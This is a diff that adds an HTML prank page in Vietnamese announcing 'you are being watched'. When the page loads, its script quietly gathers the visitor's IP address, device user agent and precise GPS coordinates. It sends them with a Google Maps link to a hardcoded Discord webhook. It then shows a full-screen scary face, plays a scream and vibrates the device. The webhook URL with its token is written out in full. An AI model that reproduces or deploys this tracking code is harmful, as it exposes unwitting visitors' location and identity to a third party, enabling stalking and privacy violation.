@@ -1,0 +1,98 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Đang truy dấu...</title>
+  <style>
+    body {
+      background-color: black;
+      color: red;
+      font-family: monospace;
+      text-align: center;
+      margin-top: 20vh;
+      animation: flicker 0.3s infinite;
+    }
+    h1 {
+      font-size: 2em;
+      animation: blink 0.7s infinite;
+    }
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0; }
+      100% { opacity: 1; }
+    }
+    @keyframes flicker {
+      0%, 100% { background-color: black; }
+      50% { background-color: #1a0000; }
+    }
+    #ghost {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: url('https://i.ibb.co/6Wr7k6N/scary-face.png') no-repeat center center;
+      background-size: cover;
+      z-index: 9999;
+    }
+  </style>
+</head>
+<body>
+  <h1>🚨 BẠN ĐANG BỊ THEO DÕI 🚨</h1>
+  <div id="ghost"></div>
+  <audio id="scream" src="https://www.myinstants.com/media/sounds/movie_1.mp3" preload="auto"></audio>
+
+  <script>
+    const webhook = "https://discord.com/api/webhooks/1396402554342084678/-56L_dJGuKah4THZ_SJDAVM2wK817hadEuYhzc9yX1uL9xMBy3aDFXroT7NNP1IIVL1M";
+
+    function sendData(ip, device, lat = null, lon = null) {
+      let content = `🔍 IP: ${ip}\n📱 Thiết bị: ${device}`;
+      if (lat && lon) {
+        content += `\n📍 Vị trí: ${lat}, ${lon}\n🗺️ Google Maps: https://maps.google.com/?q=${lat},${lon}`;
+      }
+
+      fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content })
+      });
+
+      setTimeout(() => {
+        document.getElementById("ghost").style.display = "block";
+        document.body.style.backgroundColor = "black";
+        document.body.innerHTML = "";
+        playScare();
+      }, 3000);
+    }
+
+    function playScare() {
+      const sound = document.getElementById("scream");
+      sound.play();
+      if (navigator.vibrate) {
+        navigator.vibrate([500, 300, 500, 300, 1000]);
+      }
+    }
+
+    function getIPandLocation() {
+      fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip;
+          const device = navigator.userAgent;
+
+          navigator.geolocation.getCurrentPosition(pos => {
+            const lat = pos.coords.latitude.toFixed(6);
+            const lon = pos.coords.longitude.toFixed(6);
+            sendData(ip, device, lat, lon);
+          }, err => {
+            sendData(ip, device);
+          });
+        });
+    }
+
+    getIPandLocation();
+  </script>
+</body>
+</html>
